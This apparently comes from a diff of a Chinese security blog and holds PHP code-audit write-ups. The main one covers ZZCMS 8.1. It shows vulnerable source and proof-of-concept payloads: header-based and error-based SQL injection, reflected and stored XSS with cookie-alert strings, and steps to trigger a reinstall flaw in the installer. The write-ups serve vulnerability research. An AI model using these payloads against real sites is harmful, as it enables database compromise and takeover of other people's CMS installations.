class="comment">act=edit&amp;pid=0&amp;name=%E6%9C%80%E6%96%B0%E5%8A%A8%E6%80%81&amp;seq=0&amp;description=&amp;button=%E4%BF%AE%E6%94%B9%E6%A0%8F%E7%9B%AE&amp;cid=1</span></span><br></pre></td></tr></table></figure></p>
-<p>pid，name，seq，description这四个参数都存在注入。</p>
-<p>payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
-<p><strong>0x08</strong></p>
-<p>user.add.php  1行–7行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once (&quot;global.php&quot;);</span><br><span class="line">$userid      = trim($_GET [&apos;userid&apos;])?trim($_GET [&apos;userid&apos;]):0;</span><br><span class="line">$act             = trim($_GET [&apos;act&apos;])?trim($_GET [&apos;act&apos;]):&apos;add&apos;;</span><br><span class="line">$actName = $act == &apos;add&apos;?&apos;添加&apos;:&apos;修改&apos;;</span><br><span class="line">$users = $db-&gt;find ( &quot;select * from phpaadb_users where userid=&quot; . $userid );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>注入注入注入，，，，不无聊了，，毕竟还是得审计搞搞就行了，尤其是是这个像ZZCMS一样的CMS。</p>
-<p>python才是我的最爱，而apt才是。。。</p>
-<p><strong>0x09</strong></p>
-<p>有时候我也在想，当初有一个apt的机会，我不敢闯，怕自己做不好，而安服到底是我所追求的吗？我到底一开始要成为像猪猪侠一样的白帽子，还是像江湖中的侠客一般，仗剑走天涯？可能真的应了那句话，路走的远了，可能真的忘了当初为什么要走这条路。</p>
-
       
     </div>
-
   </div>
 
-  <div class="article-footer">
-    <div class="article-meta pull-left">
 
+  
     
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/代码审计/">代码审计</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/PHP/">PHP</a><a href="/tags/CMS/">CMS</a>
-    </span>
-    
-
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 20px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 20px;">Excel</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mysql/" style="font-size: 20px;">mysql</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/vba/" style="font-size: 20px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 20px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 10px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 20px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/感悟/" style="font-size: 20px;">感悟</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
     </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2017/11/03/Zzcms8.1-of-PHP-code-audit/"><span>PHP代码审计之ZZCMS8.1</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/11/03/Zzcms8.1-of-PHP-code-audit/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-11-03T03:50:55.000Z">
-          2017-11-03
-        </time>
-      </a>
-    </span>
   </div>
 
 
   
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>前言：</p>
-<p>很早就想搞代码审计了，但是一直觉得自己其他方面还差很多，所以一直在各种补，虽说学的还没忘的快。这次选择ZZCMS8.1主要是当初，这个CMS自从离心小姐姐审计了一番后，然后我就看到吐司也有人审计，很多地方都开始审计，我就纳闷了，为啥会有这么多人审计，，，，离心给我说，估计是因为这是ZZCMS吧。。。</p>
-<p><strong>0X01</strong></p>
-<h5 id="HTTP-head-SQL-injection"><a href="#HTTP-head-SQL-injection" class="headerlink" title="HTTP head SQL injection"></a>HTTP head SQL injection</h5><p>用户登录处和管理员后台登录处都是用的同样的代码，所以都是可以注射的。</p>
-<p>G:\zzcms8.1\user\logincheck.php   18行—23行</p>
-<p>G:\zzcms8.1\admin\logincheck.php   19行—24行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ip=getip();</span><br><span class="line">$sql=<span class="string">"select * from zzcms_login_times where ip='$ip' and count&gt;='"</span>.trytimes.<span class="string">"' and unix_timestamp()-unix_timestamp(sendtime)&lt;"</span>.jgsj.<span class="string">" "</span>;</span><br><span class="line">$rs = query($sql);  <span class="comment">//执行一条 MySQL 查询</span></span><br><span class="line">$row= num_rows($rs);  <span class="comment">//返回结果集中行的数量</span></span><br></pre></td></tr></table></figure>
-<p>然后跟进一下 getip()  函数</p>
-<p>G:\zzcms8.1\inc\function.php   72行—84行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123; </span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);  <span class="comment">//getenv() 获取一个环境变量的值</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>))   <span class="comment">//strcasecmp() 比较两个字符串（不区分大小写）,如果一直返回0，否则根据情况返回正负相差的数</span></span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>); </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">		$ip = getenv(<span class="string">"REMOTE_ADDR"</span>); </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>)) </span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>]; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		$ip = <span class="string">"unknown"</span>; </span><br><span class="line">	<span class="keyword">return</span>($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后，我们可以看出，HTTP_CLIENT_IP 和 HTTP_X_FORWARDED_FOR 都是可以自己伪造的，并且没有任何限制，所以，这就是一个明显的注入点。</p>
-<p>我们就验证下常用的 HTTP_X_FORWARDED_FOR ，来构造下注入语句，测试下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">' and sleep(10) and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>在用户登录处或者后台管理页面登录处，用 burp 抓包下，添加下上句的 payload ，然后就可以看出页面延时了10秒，从而证明存在注入。</p>
-<p><strong>0X02</strong></p>
-<h5 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h5><p>在根目录的 uploadimg_form.php 文件里，存在两处没有任何过滤的可控输入输出。</p>
-<p>G:\zzcms8.1\uploadimg_form.php   66行—67行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"noshuiyin"</span> type=<span class="string">"hidden"</span> id=<span class="string">"noshuiyin"</span> value=<span class="string">"&lt;?php echo @$_GET['noshuiyin']?&gt;"</span> /&gt;</span><br><span class="line">&lt;input name=<span class="string">"imgid"</span> type=<span class="string">"hidden"</span> id=<span class="string">"imgid"</span> value=<span class="string">"&lt;?php echo @$_GET['imgid']?&gt;"</span> /&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看出可控参数 noshuiyin 和 imgid 都没有任何过滤，所以我们的 payload 只需要闭合下标签就可以达到攻击效果。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uploadimg_form.php?noshuiyin="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">uploadimg_form.php?imgid="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>这个文件也没有权限控制跳转，所以可以直接弹出弹框。</p>
-<p><strong>0X03</strong></p>
-<h5 id="Storage-type-XSS"><a href="#Storage-type-XSS" class="headerlink" title="Storage type XSS"></a>Storage type XSS</h5><p>G:\zzcms8.1\one\link.php   7行—21行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"action"</span>])==<span class="string">"add"</span>)&#123;</span><br><span class="line">	checkyzm($_POST[<span class="string">"yzm"</span>]);</span><br><span class="line">	session_write_close();</span><br><span class="line">	$sitename = <span class="keyword">isset</span>($_POST[<span class="string">'sitename'</span>])?$_POST[<span class="string">'sitename'</span>]:<span class="string">""</span>;</span><br><span class="line">	$url = <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])?addhttp($_POST[<span class="string">'url'</span>]):<span class="string">""</span>;</span><br><span class="line">	$logo = <span class="keyword">isset</span>($_POST[<span class="string">'logo'</span>])?addhttp($_POST[<span class="string">'logo'</span>]):<span class="string">""</span>;</span><br><span class="line">	$content = <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])?$_POST[<span class="string">'content'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($sitename==<span class="string">''</span>||$url==<span class="string">''</span>||$logo==<span class="string">''</span>||$content==<span class="string">''</span>)&#123;</span><br><span class="line">    	showmsg(<span class="string">'请完整填写您的信息'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	query(<span class="string">"insert into zzcms_link (sitename,url,logo,content,sendtime)values('$sitename','$url','$logo','$content','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br><span class="line">	showmsg(<span class="string">'操作成功！提示：提交申请后，请做好本站链接——如果没有增加本站的链接，那么你的申请是不会被通过的。'</span>,<span class="string">'link.php'</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看出，这里只对 sitename，url，logo，content 这四个参数判断了一下是否存在和是否为空，然后就存到数据库里了，没有进行任何过滤和其它的验证。</p>
-<p>G:\zzcms8.1\admin\linkmanage.php   127行—140行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      $rsn=query(<span class="string">"select bigclassname from zzcms_linkclass where bigclassid="</span>.$row[<span class="string">"bigclassid"</span>].<span class="string">" "</span>);</span><br><span class="line">      $rown=fetch_array($rsn); <span class="comment">//从结果集中取得一行作为数字数组或关联数组</span></span><br><span class="line">      <span class="keyword">echo</span> $rown[<span class="string">"bigclassname"</span>]<span class="meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;b&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">"sitename"</span>]<span class="meta">?&gt;</span>&lt;/b&gt;&lt;br&gt; </span><br><span class="line">        &lt;a href=<span class="string">"&lt;?php echo $row["</span>url<span class="string">"]?&gt;"</span> target=<span class="string">"_blank"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">"url"</span>]<span class="meta">?&gt;</span>&lt;/a&gt;&lt;br&gt; </span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">if</span> ($row[<span class="string">"logo"</span>]&lt;&gt;<span class="string">""</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line">        &lt;img src=<span class="string">"&lt;?php echo $row["</span>logo<span class="string">"]?&gt;"</span> width=<span class="string">"150"</span> height=<span class="string">"50"</span>&gt; </span><br><span class="line">        <span class="meta">&lt;?php</span> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"未填写LOGO地址"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="meta">?&gt;</span>      &lt;/td&gt;</span><br><span class="line">      &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">"content"</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $row[<span class="string">"sendtime"</span>]<span class="meta">?&gt;</span>&lt;/td&gt;</span><br></pre></td></tr></table></figure>
-<p>在输出的界面代码中也没有任何过滤，所以，这就造成了一个储存型XSS漏洞。</p>
-<p>好吧，出现了玄学问题，，，从 link.php 文件里存到数据库的那四个参数，其中 “ &gt; &lt; 都被实体编码了，好玄学，，，那总得出来个审计出来个储存把？</p>
-<p>G:\zzcms8.1\admin\link_save.php   21行—43行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$FriendSiteName=trim($_REQUEST[<span class="string">"sitename"</span>]); </span><br><span class="line">$url=addhttp(trim($_REQUEST[<span class="string">"url"</span>]));</span><br><span class="line">$logo=addhttp(trim($_REQUEST[<span class="string">"logo"</span>]));</span><br><span class="line">$content=trim($_REQUEST[<span class="string">"content"</span>]);</span><br><span class="line"><span class="comment">//trim()移除字符串左侧的字符 默认（"\0"-NULL ，"\t"-制表符，"\n"-换行，"\x0B"-垂直制表符，"\r"-回车，" "-空格）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"passed"</span>]))&#123;</span><br><span class="line">	$passed=$_POST[<span class="string">"passed"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$passed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"elite"</span>]))&#123;</span><br><span class="line">	$elite=$_POST[<span class="string">"elite"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$elite=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_REQUEST[<span class="string">"action"</span>]==<span class="string">"add"</span>)&#123;</span><br><span class="line">	query(<span class="string">"INSERT INTO zzcms_link (bigclassid,sitename,url,logo,content,passed,elite,sendtime)VALUES('$classid','$FriendSiteName','$url','$logo','$content','$passed','$elite','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($_REQUEST[<span class="string">"action"</span>]==<span class="string">"modify"</span>) &#123;</span><br><span class="line">	$id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">	query(<span class="string">"update zzcms_link set bigclassid='$classid',sitename='$FriendSiteName',url='$url',logo='$logo',content='$content',passed='$passed',elite='$elite',sendtime='"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"' where id='$id'"</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个是管理后台页面的添加友联，代码和上面的差不多，基本一样，那这里总不会出现玄学问题了吧？</p>
-<p>我们从这里插入常见的 payload ，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
-<p>恩，成功的弹出来了。</p>
-<p><strong>0X04</strong></p>
-<h5 id="Reload-vulnerability"><a href="#Reload-vulnerability" class="headerlink" title="Reload vulnerability"></a>Reload vulnerability</h5><p>G:\zzcms8.1\install\index.php   11行/51行—90行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:<span class="comment">//环境</span></span><br><span class="line">        $pass = <span class="keyword">true</span>;</span><br><span class="line">        $PHP_VERSION = PHP_VERSION;</span><br><span class="line">        <span class="keyword">if</span>(version_compare($PHP_VERSION, <span class="string">'4.3.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">            $php_pass = $pass = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $php_pass = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $PHP_MYSQL = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'mysql'</span>)) &#123;</span><br><span class="line">            $PHP_MYSQL = <span class="string">'支持'</span>;</span><br><span class="line">            $mysql_pass = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $PHP_MYSQL = <span class="string">'不支持'</span>;</span><br><span class="line">            $mysql_pass = $pass = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $PHP_GD = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'imagejpeg'</span>)) $PHP_GD .= <span class="string">'jpg'</span>;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'imagegif'</span>)) $PHP_GD .= <span class="string">' gif'</span>;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'imagepng'</span>)) $PHP_GD .= <span class="string">' png'</span>;</span><br><span class="line">        <span class="keyword">if</span>($PHP_GD) &#123;</span><br><span class="line">            $gd_pass = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $gd_pass = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $PHP_URL = @get_cfg_var(<span class="string">"allow_url_fopen"</span>);<span class="comment">//是否支持远程URL，采集有用</span></span><br><span class="line">        $url_pass = $PHP_URL ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:<span class="comment">//查目录属性</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:<span class="comment">//建数据库</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-<p>这个ZZCMS也是通过 install.lock 来判断是否已经安装了的，然后我们根据上面的代码可以看出 step 参数如果为空的话，就默认从 1 开始，然后我们跟进下 step_1.php 这个文件。</p>
-<p>G:\zzcms8.1\install\step_1.php   1行—5行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">"install.lock"</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div style='padding:30px;'&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这个文件里判断了当前目录下是否存在 install.lock 文件，如果存在就提示已经安装了，那继续看下 step_2.php 的内容。</p>
-<p>G:\zzcms8.1\install\step_2.php   1行—3行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(@$step==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里没有继续判断是否存在 install.lock 文件，那继续看下剩下的 step_3/4.php 里有没有判断条件。</p>
-<p>G:\zzcms8.1\install\step_3.php   1行—5行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(@$step==<span class="number">3</span>)&#123;</span><br><span class="line">	$token = md5(uniqid(rand(), <span class="keyword">true</span>));  <span class="comment">//uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。</span></span><br><span class="line">	$_SESSION[<span class="string">'token'</span>]= $token; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>G:\zzcms8.1\install\step_4.php   1行—9行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(@$step==<span class="number">4</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] != $_SESSION[<span class="string">'token'</span>] || $_POST[<span class="string">'token'</span>]==<span class="string">''</span> )&#123;    </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"非法提交"</span>.$_POST[<span class="string">'token'</span>].<span class="string">"&lt;br&gt;"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">		<span class="comment">//&#125;else&#123;</span></span><br><span class="line">		<span class="comment">//unset($_SESSION['token']);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>step_3.php 这个文件里也没有判断是否存在 install.lock 这个文件，只不过在 session 里添加了一个随机 token ，然后 step_4.php 文件里也没有判断 install.lock ，只是验证了一下在 3 里的那个 token ，所以，3 到 4 这个步骤不能越过，但是，这是个重装漏洞是妥妥的了。</p>
-<p>我们只需要进入 install\index.php  路劲文件下，POST 一下 2 ，然后按顺序走下去就重装了这个CMS。</p>
-<p><strong>0X05</strong></p>
-<p>这个CMS后台管理处，还有一堆储存型XSS。。。。</p>
-
-      
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/11/22/My-Django-notes/">Django2.x 学习笔记分享&amp;学习路线推荐</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/09/Django-deployment-method-one/">Centos6.9+Python3+Nginx+Uwsgi+Django2.0</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/07/Blog-source-code-based-on-Python3-and-Django/">基于Python3和Django编写的博客源码</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/25/Maybe-it-s-a-turn-or-it-s-just-a-normal-thing/">或许是而转折，或者随之平常</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/18/Hexo-GitHub-Blog-Follow-up-Maintenance-Problem-Solution/">hexo+GitHub博客后续维护问题解决方案</a>
+          </li>
+        
+      </ul>
     </div>
-
   </div>
 
-  <div class="article-footer">
-    <div class="article-meta pull-left">
 
-    
-      
+  
+</aside>
 
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/代码审计/">代码审计</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/PHP/">PHP</a><a href="/tags/CMS/">CMS</a>
-    </span>
-    
-
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2020 shiyan All Rights Reserved. 
